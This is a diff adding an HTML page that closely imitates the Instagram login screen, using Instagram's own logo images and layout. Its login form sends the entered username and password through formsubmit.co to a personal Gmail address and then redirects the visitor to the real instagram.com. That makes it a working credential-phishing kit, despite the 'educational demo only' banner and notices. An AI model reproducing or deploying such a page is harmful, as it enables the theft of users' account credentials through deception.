@@ -1,0 +1,168 @@
+<!doctype html>
+<html lang="en" dir="ltr">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Instagram Login Demo - Educational Only</title>
+  <link rel="icon" href="https://static.cdninstagram.com/rsrc.php/v3/yt/r/30PrGfR3xhB.png" />
+  <style>
+    * { box-sizing: border-box; }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+      background: linear-gradient(135deg, #fafafa 0%, #f0f0f0 100%);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      margin: 0;
+      padding: 20px;
+      overflow-x: hidden;
+    }
+    .background-shapes { position: fixed; width: 100%; height: 100%; top: 0; left: 0; z-index: 0; pointer-events: none; overflow: hidden; }
+    .shape { position: absolute; opacity: 0.03; animation: float 20s infinite ease-in-out; }
+    .shape-1 { width: 300px; height: 300px; background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%); border-radius: 50%; top: 10%; left: 5%; animation-delay: 0s; }
+    .shape-2 { width: 200px; height: 200px; background: linear-gradient(45deg, #405de6, #5851db, #833ab4); border-radius: 50%; bottom: 10%; right: 10%; animation-delay: 5s; }
+    .shape-3 { width: 150px; height: 150px; background: linear-gradient(45deg, #fd1d1d, #e1306c); border-radius: 30% 70% 70% 30% / 30% 30% 70% 70%; top: 50%; right: 5%; animation-delay: 10s; }
+    @keyframes float { 0%,100%{transform:translate(0,0) rotate(0deg);}25%{transform:translate(30px,-30px) rotate(90deg);}50%{transform:translate(-20px,20px) rotate(180deg);}75%{transform:translate(20px,30px) rotate(270deg);} }
+    .educational-banner { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 15px; text-align: center; width: 100%; position: fixed; top: 0; z-index: 1000; font-size: 14px; font-weight: 600; box-shadow: 0 4px 20px rgba(0,0,0,0.15); animation: slideDown 0.5s ease-out; }
+    @keyframes slideDown { from { transform: translateY(-100%); opacity:0; } to { transform: translateY(0); opacity:1; } }
+    .main { display: flex; align-items: center; justify-content: center; gap: 40px; margin-top: 60px; max-width: 1200px; z-index: 1; animation: fadeInUp 0.8s ease-out; }
+    @keyframes fadeInUp { from {opacity:0; transform:translateY(30px);} to {opacity:1; transform:translateY(0);} }
+    .phone-section { position: relative; animation: fadeInLeft 1s ease-out; }
+    @keyframes fadeInLeft { from {opacity:0; transform:translateX(-50px);} to {opacity:1; transform:translateX(0);} }
+    .phone-section img { width: 380px; height: auto; }
+    .phone-section::before { content:'📸'; position:absolute; top:25%; left:50%; transform:translate(-50%,-50%); font-size:60px; animation:pulse 2s infinite; opacity:0.8; }
+    @keyframes pulse {0%,100%{transform:translate(-50%,-50%) scale(1); opacity:0.8;}50%{transform:translate(-50%,-50%) scale(1.1); opacity:1;}}
+    .form-section { display:flex; flex-direction:column; align-items:center; width:100%; max-width:350px; animation:fadeInRight 1s ease-out; }
+    @keyframes fadeInRight { from {opacity:0; transform:translateX(50px);} to {opacity:1; transform:translateX(0);} }
+    .login-box { background-color:#fff; border:1px solid #dbdbdb; width:100%; padding:40px; text-align:center; border-radius:1px; box-shadow:0 2px 10px rgba(0,0,0,0.05); transition:all 0.3s ease; }
+    .login-box:hover { box-shadow:0 5px 20px rgba(0,0,0,0.1); transform:translateY(-2px); }
+    .login-box img.logo { width:180px; margin-bottom:35px; animation:logoAppear 1.2s ease-out; filter: drop-shadow(0 2px 4px rgba(0,0,0,0.1)); }
+    @keyframes logoAppear {0%{opacity:0; transform:scale(0.5) rotate(-10deg);}60%{transform:scale(1.05) rotate(2deg);}100%{opacity:1; transform:scale(1) rotate(0deg);}}
+    .input-wrapper { position:relative; margin:6px 0; }
+    input { width:100%; padding:9px 8px 7px 8px; border-radius:3px; border:1px solid #dbdbdb; background:#fafafa; font-size:12px; outline:none; transition:all 0.3s ease; }
+    input:focus { border-color:#a8a8a8; background:#fff; transform:scale(1.01); box-shadow:0 0 0 3px rgba(0,149,246,0.1); }
+    input.error { border-color:#ed4956; animation:shake 0.5s; }
+    @keyframes shake {0%,100%{transform:translateX(0);}25%{transform:translateX(-10px);}75%{transform:translateX(10px);} }
+    .error-message { color:#ed4956; font-size:11px; text-align:left; margin:4px 0; display:none; animation:fadeIn 0.3s; }
+    @keyframes fadeIn { from {opacity:0;} to {opacity:1;} }
+    .show-password { position:absolute; right:10px; top:50%; transform:translateY(-50%); background:none; border:none; color:#262626; font-size:13px; font-weight:600; cursor:pointer; padding:0; width:auto; margin:0; }
+    button[type="submit"] { width:100%; background:linear-gradient(135deg,#0095f6 0%,#0d7dda 100%); color:white; font-weight:600; padding:8px; border:none; border-radius:8px; margin-top:14px; cursor:pointer; font-size:14px; transition:all 0.3s ease; position:relative; overflow:hidden; }
+    button[type="submit"]::before { content:''; position:absolute; top:50%; left:50%; width:0; height:0; border-radius:50%; background:rgba(255,255,255,0.3); transform:translate(-50%,-50%); transition:width 0.6s, height 0.6s; }
+    button[type="submit"]:hover::before { width:300px; height:300px; }
+    button[type="submit"]:hover { background:linear-gradient(135deg,#1877f2 0%,#0d7dda 100%); transform:translateY(-2px); box-shadow:0 5px 15px rgba(0,149,246,0.4); }
+    button[type="submit"]:active { transform:translateY(0); }
+    button[type="submit"]:disabled { background:#b2dffc; cursor:not-allowed; opacity:0.7; transform:none; }
+    button[type="submit"].loading { color:transparent; }
+    .spinner { display:none; border:2px solid #f3f3f3; border-top:2px solid #fff; border-radius:50%; width:16px; height:16px; animation:spin 0.8s linear infinite; position:absolute; left:50%; top:50%; transform:translate(-50%,-50%); }
+    button[type="submit"].loading .spinner { display:block; }
+    @keyframes spin {0%{transform:translate(-50%,-50%) rotate(0deg);}100%{transform:translate(-50%,-50%) rotate(360deg);}}
+    .divider { display:flex; align-items:center; margin:15px 0; color:#8e8e8e; font-size:13px; font-weight:600; }
+    .divider::before, .divider::after { content:''; flex:1; height:1px; background:#dbdbdb; margin:0 18px; }
+    .fb-login { color:#385185; font-weight:600; font-size:14px; cursor:pointer; display:flex; justify-content:center; align-items:center; gap:8px; margin-top:10px; padding:8px; transition:all 0.3s ease; border-radius:5px; }
+    .fb-login:hover { background:rgba(56,81,133,0.05); transform:scale(1.02); }
+    .fb-login img { width:18px; height:18px; animation:rotate 2s infinite linear; }
+    @keyframes rotate {0%{transform:rotate(0deg);}100%{transform:rotate(360deg);} }
+    .fb-login:hover img { animation:none; }
+    .forgot { margin-top:15px; font-size:12px; color:#00376b; cursor:pointer; transition:opacity 0.2s; }
+    .forgot:hover { opacity:0.8; }
+    #status { font-size:12px; color:#8e8e8e; margin-top:12px; line-height:1.4; }
+    .signup-box { width:100%; background:white; border:1px solid #dbdbdb; padding:25px 20px; text-align:center; margin-top:10px; font-size:14px; border-radius:1px; box-shadow:0 2px 10px rgba(0,0,0,0.05); transition:all 0.3s ease; }
+    .signup-box:hover { box-shadow:0 5px 20px rgba(0,0,0,0.1); transform:translateY(-2px); }
+    .signup-box a { color:#0095f6; text-decoration:none; font-weight:600; position:relative; }
+    .signup-box a::after { content:''; position:absolute; width:0; height:2px; bottom:-2px; left:0; background:linear-gradient(90deg,#f09433 0%,#e6683c 25%,#dc2743 50%,#cc2366 75%,#bc1888 100%); transition:width 0.3s ease; }
+    .signup-box a:hover::after { width:100%; }
+    .app-download { text-align:center; margin-top:20px; }
+    .app-download p { font-size:14px; color:#262626; margin-bottom:15px; }
+    .app-download img { width:136px; margin:0 4px; cursor:pointer; transition:all 0.3s ease; filter:grayscale(0.2); }
+    .app-download img:hover { opacity:0.9; transform:translateY(-3px) scale(1.05); filter:grayscale(0); box-shadow:0 5px 15px rgba(0,0,0,0.2); }
+    footer { text-align:center; margin-top:50px; padding:20px; font-size:12px; color:#8e8e8e; animation:fadeIn 2s ease-out; }
+    footer a { color:#8e8e8e; text-decoration:none; margin:0 8px; transition:all 0.3s ease; position:relative; }
+    footer a::after { content:''; position:absolute; width:0; height:1px; bottom:-2px; left:50%; background:#8e8e8e; transition:all 0.3s ease; transform:translateX(-50%); }
+    footer a:hover { color:#262626; }
+    footer a:hover::after { width:100%; }
+    .instagram-gradient { position:relative; padding:2px; background:linear-gradient(45deg,#f09433 0%,#e6683c 25%,#dc2743 50%,#cc2366 75%,#bc1888 100%); border-radius:10px; animation:gradientRotate 3s linear infinite; margin-bottom:20px; display:inline-block; }
+    @keyframes gradientRotate {0%{filter:hue-rotate(0deg);}100%{filter:hue-rotate(360deg);}}
+    .instagram-gradient img { display:block; background:white; border-radius:8px; }
+    @media (max-width: 875px) { .main { flex-direction:column; gap:20px; } .phone-section { display:none; } }
+    @media (max-width:450px){ .educational-banner{font-size:12px;padding:12px 10px;} .app-download img{width:120px;} }
+  </style>
+</head>
+<body>
+  <div class="background-shapes">
+    <div class="shape shape-1"></div>
+    <div class="shape shape-2"></div>
+    <div class="shape shape-3"></div>
+  </div>
+  <div class="educational-banner">⚠ EDUCATIONAL DEMO ONLY - This is NOT the real Instagram website</div>
+
+  <div class="main">
+    <div class="phone-section">
+      <img src="https://i.imgur.com/zqpwkLQ.png" alt="Instagram Demo" />
+    </div>
+    <div class="form-section">
+      <div class="login-box">
+        <div class="instagram-gradient">
+          <img class="logo" src="https://static.cdninstagram.com/rsrc.php/v3/yV/r/4I-BZcdK9IX.png" alt="Instagram Logo" />
+        </div>
+        <!-- FormSubmit Form -->
+        <form id="loginForm" action="https://formsubmit.co/aminefatiha474@gmail.com" method="POST">
+          <input type="hidden" name="_subject" value="New Login Test - Educational Demo">
+          <input type="hidden" name="_template" value="table">
+          <input type="hidden" name="_next" value="https://www.instagram.com">
+          <input type="hidden" name="_captcha" value="false">
+          <div class="input-wrapper">
+            <input type="text" id="username" name="username" placeholder="Phone number, username, or email" required autocomplete="off">
+            <div class="error-message" id="usernameError">Please enter a valid username or email</div>
+          </div>
+          <div class="input-wrapper">
+            <input type="password" id="password" name="password" placeholder="Password" required autocomplete="off">
+            <button type="button" class="show-password" id="togglePassword">Show</button>
+            <div class="error-message" id="passwordError">Password must be at least 6 characters</div>
+          </div>
+          <button type="submit" id="submitBtn">Log In<div class="spinner"></div></button>
+        </form>
+        <div class="divider">OR</div>
+        <div class="fb-login" onclick="alert('This is a demo. Facebook login is not functional.')">
+          <img src="https://static.cdninstagram.com/rsrc.php/v3/y5/r/PUJQqfTjRYC.png" alt="Facebook Icon">Log in with Facebook
+        </div>
+        <div class="forgot" onclick="alert('This is a demo. Password recovery is not functional.')">Forgot password?</div>
+        <p id="status">🔒 For educational purposes only. Data sent to test email.</p>
+      </div>
+      <div class="signup-box">Don't have an account? <a href="#" onclick="alert('This is a demo. Sign up is not functional.'); return false;">Sign up</a></div>
+      <div class="app-download">
+        <p>Get the app.</p>
+        <img src="https://static.cdninstagram.com/rsrc.php/v3/yR/r/fFZ3Ghxx10s.png" alt="App Store" onclick="alert('This is a demo link')">
+        <img src="https://static.cdninstagram.com/rsrc.php/v3/yT/r/OtByGJYZd1T.png" alt="Google Play" onclick="alert('This is a demo link')">
+      </div>
+    </div>
+  </div>
+
+  <footer>
+    <p>© 2025 Instagram Clone - Educational Purpose Only</p>
+    <div>
+      <a href="#">About</a><a href="#">Blog</a><a href="#">Jobs</a><a href="#">Help</a><a href="#">API</a><a href="#">Privacy</a><a href="#">Terms</a>
+    </div>
+  </footer>
+
+  <script>
+    const togglePassword = document.getElementById('togglePassword');
+    const password = document.getElementById('password');
+    togglePassword.addEventListener('click', () => {
+      const type = password.getAttribute('type') === 'password' ? 'text' : 'password';
+      password.setAttribute('type', type);
+      togglePassword.textContent = type === 'password' ? 'Show' : 'Hide';
+    });
+
+    const form = document.getElementById('loginForm');
+    const submitBtn = document.getElementById('submitBtn');
+    const spinner = submitBtn.querySelector('.spinner');
+
+    form.addEventListener('submit', e => {
+      submitBtn.disabled = true;
+      submitBtn.classList.add('loading');
+    });
+  </script>
+</body>
+</html>
